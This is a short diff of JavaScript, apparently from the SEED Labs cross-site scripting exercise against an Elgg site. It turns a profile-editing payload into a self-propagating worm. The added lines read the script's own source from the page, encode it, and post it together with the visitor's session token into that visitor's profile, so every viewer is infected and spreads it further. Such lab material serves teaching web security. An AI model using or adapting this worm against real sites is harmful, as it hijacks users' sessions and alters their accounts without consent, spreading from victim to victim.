@@ -5,10 +5,15 @@ window.onload = function () {
 	var token="&__elgg_token="+elgg.security.token.__elgg_token;
 	var sendurl="http://www.seed-server.com/action/profile/edit";
 	
-	var content="description=<p>MODIFIED!</p>"+ts+token+guid+userName;
+	var headerTag="<script id=\"worm\" type=\"text/javascript\">";
+	var jsCode=document.getElementById("worm").innerHTML;
+	var tailTag="</" + "script>";
+	var wormCode=encodeURIComponent(headerTag+jsCode+tailTag);
+	var content="description=<p>INFECTED!</p>"+wormCode+ts+token+guid+userName;
 	var samyGuid=59;
 	
 	if(elgg.session.user.guid!=samyGuid) {
+		alert("INFECTED!");
 		var Ajax=null;
 		Ajax=new XMLHttpRequest();
 		Ajax.open("POST", sendurl, true);
